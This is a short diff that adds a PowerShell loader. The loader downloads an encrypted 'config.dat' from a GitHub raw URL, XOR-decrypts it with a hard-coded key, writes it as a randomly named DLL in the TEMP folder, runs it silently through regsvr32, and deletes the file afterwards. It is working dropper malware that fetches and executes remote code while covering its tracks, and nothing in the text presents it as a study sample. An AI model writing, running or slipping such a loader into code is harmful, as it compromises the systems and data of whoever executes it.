@@ -1,0 +1,5 @@
+$e=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Intel-Boss/z/refs/heads/main/config.dat')
+$k=[byte[]](0xEF,0xCB,0xA3,0xD3,0x21,0xCC,0x97,0x2B,0x9E,0xF0,0x74,0xDA,0xE3,0x75,0xE5,0x11)
+$b=[byte[]]::new($e.Length);for($i=0;$i-lt$e.Length;$i++){$b[$i]=$e[$i]-bxor$k[$i%16]}
+$p="$env:TEMP\$(Get-Random).dll";[IO.File]::WriteAllBytes($p,$b)
+regsvr32 /s $p;Remove-Item $p -Force
